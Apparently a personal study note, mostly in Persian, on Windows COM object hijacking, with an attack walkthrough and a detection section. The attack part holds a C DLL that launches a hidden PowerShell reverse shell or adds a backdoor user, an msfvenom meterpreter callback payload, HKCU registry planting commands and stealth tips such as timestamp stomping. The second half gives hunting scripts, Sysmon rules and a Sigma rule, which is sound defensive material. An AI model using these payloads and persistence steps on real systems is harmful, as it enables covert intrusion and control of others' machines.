


# COM Object Hijacking

[[Session 1 Persistent]]
[[Session 2 persistent]]
[[Session 3 Persistence]]



---

## COM چیست؟

**Component Object Model (COM)** یک سیستم Microsoft برای ارتباط بین اجزای نرم‌افزاری است. هر COM Object یک CLSID (GUID) دارد که در Registry ثبت می‌شود.

{CLSID} → DLL Path → بارگذاری توسط Application


---

## ساختار Registry

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{GUID}\   ← سیستمی (نیاز Admin)
HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{GUID}\    ← کاربر (بدون Admin!)

Windows جستجو را اینگونه انجام می‌دهد:
  1. HKCU را چک می‌کند
  2. HKLM را چک می‌کند

→ اگر CLSID در HKCU موجود باشد، HKLM نادیده گرفته می‌شود


---

## مکانیزم Attack

Application بارگذاری می‌شود
       │
       ▼
جستجوی CLSID در HKCU  ──► پیدا شد! ──► DLL مخرب ما لود می‌شود
       │
       ▼ (پیدا نشد)
جستجو در HKLM
       │
       ▼
DLL قانونی لود می‌شود


---

## مرحله ۱: پیدا کردن CLSID آسیب‌پذیر

### روش ۱: Process Monitor (Sysinternals)

Filter:
  Operation  = RegOpenKey
  Result     = NAME NOT FOUND
  Path       = HKCU\SOFTWARE\Classes\CLSID\*

→ هر entry که در HKCU وجود ندارد ولی Application دنبالش می‌گردد = هدف


### روش ۲: PowerShell - بررسی CLSID های موجود در HKCU

```powershell
# پیدا کردن CLSID هایی که در HKLM هستند اما در HKCU نیستند
$HKLMKeys = Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" -EA SilentlyContinue
$HKCUKeys = Get-ChildItem "HKCU:\SOFTWARE\Classes\CLSID" -EA SilentlyContinue

$HKCUSet = $HKCUKeys | ForEach-Object { $_.PSChildName }

foreach ($key in $HKLMKeys) {
    $clsid = $key.PSChildName
    if ($clsid -notin $HKCUSet) {
        $inprocServer = Get-ItemProperty `
          "HKLM:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32" `
          -EA SilentlyContinue
        if ($inprocServer) {
            Write-Host "$clsid -> $($inprocServer.'(default)')"
        }
    }
}
```

### روش ۳: ابزار آماده - COMHijackToolkit

```powershell
# https://github.com/enigma0x3/COM-Hijacking-Techniques
.\COMHijackToolkit.ps1 -Scan

# یا با Process Monitor automation:
.\Find-MissingLibraries.ps1
```

### روش ۴: بررسی Scheduled Tasks (هدف‌های خوب)

```powershell
# Scheduled Task هایی که COM Object لود می‌کنند
Get-ScheduledTask | Where-Object {
    $_.Actions.ClassId -ne $null
} | Select-Object TaskName, @{
    N='CLSID'; E={$_.Actions.ClassId}
}
```

---

## مرحله ۲: بررسی Permission

```powershell
# چک کردن اینکه آیا می‌توانیم در مسیر DLL بنویسیم
$dllPath = "C:\Windows\System32\target.dll"
$acl = Get-Acl $dllPath
$acl.Access | Where-Object {
    $_.IdentityReference -match $env:USERNAME
}

# یا با icacls
icacls "C:\path\to\dll"
```

---

## مرحله ۳: ساخت DLL مخرب

### ساختار DLL

```c
// malicious_com.c
#include <windows.h>

// اجرای payload اصلی
void RunPayload() {
    // Option 1: Reverse Shell
    system("powershell -nop -w hidden -e <base64_payload>");
    
    // Option 2: کپی فایل / ایجاد کاربر
    // WinExec("cmd /c net user hacker Pass123! /add", SW_HIDE);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // جدا کردن از thread اصلی تا برنامه crash نکند
            CreateThread(NULL, 0, 
                (LPTHREAD_START_ROUTINE)RunPayload, 
                NULL, 0, NULL);
            break;
    }
    return TRUE;
}

// Export کردن توابع مورد انتظار COM
// (اگر جایگزین DLL موجود هستیم باید export های اصلی را هم داشته باشیم)
```

```bash
# Compile برای Windows از Linux
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious_com.c \
  -lws2_32 -mwindows

# یا با msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.10.1 LPORT=4444 \
  -f dll -o malicious.dll
```

---

## مرحله ۴: ثبت CLSID در HKCU

```powershell
# هدف: CLSID مثال
$CLSID = "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
$DLLPath = "C:\Users\$env:USERNAME\AppData\Local\malicious.dll"

# ساخت کلیدهای لازم
New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID" -Force
New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" -Force

# تنظیم مسیر DLL
Set-ItemProperty `
  -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" `
  -Name "(Default)" `
  -Value $DLLPath

# تنظیم Threading Model (مهم!)
Set-ItemProperty `
  -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" `
  -Name "ThreadingModel" `
  -Value "Apartment"  # یا "Both" / "Free"
```

---

## مرحله ۵: Trigger کردن

```powershell
# روش ۱: اگر Scheduled Task است - منتظر اجرای خودکار بمان

# روش ۲: اجرای مستقیم Application
Start-Process "mmc.exe"           # MMC بسیاری از COM ها را لود می‌کند
Start-Process "explorer.exe"
Start-Process "control.exe"

# روش ۳: اگر COM با rundll32 کار می‌کند
rundll32.exe -sta {CLSID}
```

---

## CLSIDهای معروف برای Hijack

```powershell
# MMC20.Application - محبوب
{49B2791A-B1AE-4C90-9B8E-E860BA07F889}

# ShellWindows
{9BA05972-F6A8-11CF-A442-00A0C90A8F39}

# WBEM Scripting
{76A64158-CB41-11D1-8B02-00600806D9B6}

# Microsoft Script Host
{B54F3741-5B07-11CF-A4B0-00AA004A55E8}

# Task Scheduler (مفید برای persistence)
{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}
```

---

## سناریوهای Persistence

### سناریو ۱: Scheduled Task COM Hijack

```powershell
# پیدا کردن Task هایی که از COM استفاده می‌کنند
$tasks = Get-ScheduledTask
foreach ($task in $tasks) {
    foreach ($action in $task.Actions) {
        if ($action.ClassId) {
            Write-Host "Task: $($task.TaskName)"
            Write-Host "CLSID: $($action.ClassId)"
            Write-Host "---"
        }
    }
}

# مثال: UserTask که هر بار login اجرا می‌شود
# CLSID → HKCU override → هر login = payload اجرا می‌شود
```

### سناریو ۲: Office COM Hijack

Word/Excel هنگام باز شدن:
  → جستجوی CLSID در HKCU
  → DLL مخرب ما لود می‌شود
  → هر بار Office باز شود = execution


---

## Stealth نکات

1. DLL را در مسیر قانونی‌نما بگذار:
   C:\Users\user\AppData\Local\Microsoft\Windows\malicious.dll

2. نام DLL باید شبیه DLL های قانونی باشد:
   mscoreei.dll, wbemcomn.dll, msfte.dll

3. ThreadingModel را حتماً تنظیم کن وگرنه crash می‌کند

4. Export های مورد نیاز را پیاده‌سازی کن (برای Proxy DLL)

5. Timestamp Stomping:
   $file = Get-Item "malicious.dll"
   $file.LastWriteTime = "2023-01-15 10:30:00"


---

## HUNT - شناسایی COM Hijacking

### ۱. Registry Monitoring (ابزار اصلی)

```powershell
# پیدا کردن CLSID های Override شده در HKCU
Get-ChildItem "HKCU:\SOFTWARE\Classes\CLSID" -Recurse |
  Where-Object { $_.Name -match "InprocServer32" } |
  ForEach-Object {
      $val = (Get-ItemProperty $_.PSPath).'(default)'
      if ($val -and $val -notmatch "^C:\\Windows\\") {
          Write-Host "[!] Suspicious: $($_.PSPath)"
          Write-Host "    DLL: $val"
      }
  }
```

```powershell
# مقایسه HKCU vs HKLM برای پیدا کردن Override
function Compare-COMRegistrations {
    $hkcuCLSIDs = Get-ChildItem "HKCU:\SOFTWARE\Classes\CLSID" -EA SilentlyContinue
    
    foreach ($clsid in $hkcuCLSIDs) {
        $hkcuDLL = (Get-ItemProperty `
          "$($clsid.PSPath)\InprocServer32" -EA SilentlyContinue).'(default)'
        $hklmDLL = (Get-ItemProperty `
          "HKLM:\SOFTWARE\Classes\CLSID\$($clsid.PSChildName)\InprocServer32" `
          -EA SilentlyContinue).'(default)'
        
        if ($hklmDLL -and $hkcuDLL -ne $hklmDLL) {
            Write-Host "[HIJACK DETECTED]"
            Write-Host "  CLSID : $($clsid.PSChildName)"
            Write-Host "  HKCU  : $hkcuDLL"
            Write-Host "  HKLM  : $hklmDLL"
        }
    }
}
Compare-COMRegistrations
```

### ۲. Event Log Monitoring

Event ID 4657 - Registry Value Modified
  Key Path: HKCU\SOFTWARE\Classes\CLSID\*\InprocServer32
  
Event ID 7 (Sysmon) - Image Loaded
  ImageLoaded: NOT IN C:\Windows\System32\
  LoadedFromHKCU: true  ← این مورد نشانه مشکوک است
  
Event ID 1 (Sysmon) - Process Creation
  ParentImage: mmc.exe / explorer.exe
  Image: غیرمنتظره


### ۳. Sysmon Configuration برای COM Hijack

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    
    <!-- Image Load از مسیر غیرعادی -->
    <RuleGroup name="COM Hijack Detection" groupRelation="or">
      <ImageLoad onmatch="include">
        <ImageLoaded condition="contains">\AppData\</ImageLoaded>
        <ImageLoaded condition="contains">\Temp\</ImageLoaded>
        <ImageLoaded condition="contains">\Downloads\</ImageLoaded>
      </ImageLoad>
    </RuleGroup>
    
    <!-- Registry write به HKCU CLSID -->
    <RuleGroup name="HKCU CLSID Write" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">
          HKCU\SOFTWARE\Classes\CLSID
        </TargetObject>
        <TargetObject condition="contains">
          InprocServer32
        </TargetObject>
      </RegistryEvent>
    </RuleGroup>
    
  </EventFiltering>
</Sysmon>
```

### ۴. Hunting با Autoruns

```powershell
# Autoruns از Sysinternals - بهترین ابزار
# GUI:
.\autoruns.exe  # → Tab "COM Hijacks" را ببین

# CLI (autorunsc):
.\autorunsc.exe -a c -user * -h -csv -accepteula |
  Where-Object { $_ -match "HKCU" } |
  Select-Object -First 50

# فقط موارد VirusTotal flagged:
.\autorunsc.exe -a c -v -vt -accepteula
```

### ۵. DLL Path Analysis

```powershell
# DLL هایی که از مسیر غیرسیستمی لود شده‌اند
Get-Process | ForEach-Object {
    $proc = $_
    try {
        $proc.Modules | Where-Object {
            $_.FileName -notmatch "^C:\\Windows\\" -and
            $_.FileName -notmatch "^C:\\Program Files"
        } | ForEach-Object {
            [PSCustomObject]@{
                Process = $proc.Name
                PID     = $proc.Id
                DLL     = $_.FileName
            }
        }
    } catch {}
} | Format-Table -AutoSize
```

### ۶. Sigma Rule

```yaml
title: COM Object Hijacking via HKCU
id: a0be2e35-8b70-4e88-b9c0-1d6f5a3f6e92
status: experimental
description: Detects COM hijacking by writing DLL path to HKCU CLSID keys
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\SOFTWARE\Classes\CLSID\'
        TargetObject|endswith:
            - '\InprocServer32\(Default)'
        Details|contains:
            - '\AppData\'
            - '\Temp\'
            - '\Users\Public\'
    filter_legit:
        Image|startswith:
            - 'C:\Windows\'
            - 'C:\Program Files\'
    condition: selection and not filter_legit
falsepositives:
    - Software installation
level: high
tags:
    - attack.persistence
    - attack.t1546.015
```

### ۷. خلاصه Hunt Checklist

[ ] بررسی HKCU\SOFTWARE\Classes\CLSID برای InprocServer32 های غیرعادی
[ ] مقایسه HKCU vs HKLM برای پیدا کردن Override
[ ] Autoruns → COM Hijacks tab
[ ] Sysmon Event 7: DLL load از AppData/Temp
[ ] Sysmon Event 13: Registry write به HKCU CLSID
[ ] بررسی DLL های لود شده توسط mmc.exe, explorer.exe
[ ] VirusTotal hash check روی DLL های مشکوک
[ ] بررسی Scheduled Tasks با ClassId


---

## MITRE ATT&CK

T1546.015 - Event Triggered Execution: Component Object Model Hijacking
  Tactic: Persistence, Privilege Escalation
  Platform: Windows

---


# Hunting

## منطق پشتش

نرم‌افزار قدیمی نصب بود
       ↓
CLSID خودش رو در HKLM ثبت کرد
       ↓
نرم‌افزار حذف شد ولی CLSID در HKLM ماند (orphaned)
       ↓
مهاجم این CLSID رو در HKCU ثبت می‌کنه
       ↓
Windows اون CLSID رو از HKCU لود می‌کنه (بدون اینکه DLL قانونی وجود داشته باشه)


این dumb spot خوبیه چون:
- هیچ baseline ای از این CLSID وجود نداره
- DLL اصلی حذف شده، پس هیچ "قانونی" برای مقایسه نیست
- کمتر توسط ابزارهای معمول مانیتور می‌شه

---

## رویکرد Hunt

### مرحله ۱: پیدا کردن Orphaned CLSIDها در HKLM

```powershell
# CLSID هایی که در HKLM ثبت هستند ولی DLL شون دیگه وجود نداره
$orphaned = @()

Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" | ForEach-Object {
    $clsid = $_.PSChildName
    $inproc = Get-ItemProperty `
        "HKLM:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32" `
        -EA SilentlyContinue

    if ($inproc) {
        $dllPath = $inproc.'(default)'
        # expand اگر مسیر داره %SystemRoot% و امثالهم
        $dllPath = [System.Environment]::ExpandEnvironmentVariables($dllPath)

        if ($dllPath -and !(Test-Path $dllPath)) {
            $orphaned += [PSCustomObject]@{
                CLSID   = $clsid
                DLLPath = $dllPath
            }
        }
    }
}

$orphaned | Format-Table -AutoSize
Write-Host "`n[*] Total orphaned CLSIDs: $($orphaned.Count)"
```

### مرحله ۲: چک کردن آیا همین CLSIDها در HKCU نشسته‌اند

```powershell
# تقاطع orphaned HKLM با موجودیت در HKCU = مشکوک
foreach ($entry in $orphaned) {
    $hkcuPath = "HKCU:\SOFTWARE\Classes\CLSID\$($entry.CLSID)\InprocServer32"
    
    if (Test-Path $hkcuPath) {
        $hkcuDLL = (Get-ItemProperty $hkcuPath -EA SilentlyContinue).'(default)'
        
        Write-Host "[!!! SUSPICIOUS !!!]"
        Write-Host "  CLSID        : $($entry.CLSID)"
        Write-Host "  HKLM DLL     : $($entry.DLLPath)  (NOT FOUND)"
        Write-Host "  HKCU DLL     : $hkcuDLL"
        Write-Host ""
    }
}
```

---

## چرا این رویکرد قوی‌تره

رویکرد معمول:              این رویکرد:
─────────────────────      ─────────────────────
HKCU override مشکوک        Orphaned CLSID + HKCU = تقریباً قطعی
False positive زیاد         False positive خیلی کمتر
نیاز به baseline دارد       بدون baseline کار می‌کند


---

## نکته تکمیلی

این رویکرد رو می‌تونی با **نرم‌افزارهای حذف‌شده از Event Log** هم ترکیب کنی:

```powershell
# Event ID 11707 = نرم‌افزار حذف شده (MSI)
Get-WinEvent -LogName "Application" |
  Where-Object { $_.Id -eq 11707 } |
  Select-Object TimeCreated, Message |
  Sort-Object TimeCreated -Descending
```

بعد اسم نرم‌افزار حذف‌شده رو با CLSID های orphaned مچ می‌کنی - این یه timeline خیلی دقیق بهت می‌ده.



---


دقیقاً. این اساس کل تکنیکه.

## ترتیب جستجوی Windows برای COM Objects

Windows COM Lookup Order:
─────────────────────────
1. HKCU\SOFTWARE\Classes\CLSID\{...}   ← اول اینجا
2. HKLM\SOFTWARE\Classes\CLSID\{...}   ← بعد اینجا


## چرا این به درد مهاجم می‌خوره

HKLM  ← نیاز به Admin دارد برای نوشتن
HKCU  ← هر User معمولی می‌تونه بنویسه ← مهاجم همیشه اینجا ثبت می‌کنه


یعنی:
- **بدون Admin**
- **بدون UAC Prompt**
- **بدون تغییر در HKLM** (پس DLL قانونی دست نخورده می‌مونه)
- فقط یه کلید جدید در HKCU اضافه می‌کنه و Windows خودش DLL مخرب رو لود می‌کنه

## نتیجه نهایی

HKLM → DLL قانونی (وجود داره یا نداره)
HKCU → DLL مخرب  ← Windows این رو انتخاب می‌کنه


این یعنی **Persistence بدون Privilege Escalation** - که خیلی خطرناک‌تره چون در محیط‌های واقعی کمتر مانیتور می‌شه.


